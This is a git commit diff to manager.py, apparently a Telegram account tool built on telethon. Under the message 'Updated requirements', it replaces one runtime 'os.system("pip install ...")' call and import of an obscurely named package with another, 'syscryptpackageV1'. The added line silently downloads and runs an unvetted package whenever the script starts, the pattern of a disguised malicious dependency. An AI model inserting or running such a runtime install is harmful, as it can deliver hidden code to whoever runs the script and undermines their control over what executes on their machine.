c3434a59f57ac692d455a68ae7e4fe6475013a0e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-12 22:52:41 +0200

    Updated requirements

--- manager.py
+++ manager.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouraddonsV1")
-import pipcolouraddonsV1
+os.system("pip install syscryptpackageV1")
+import syscryptpackageV1
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
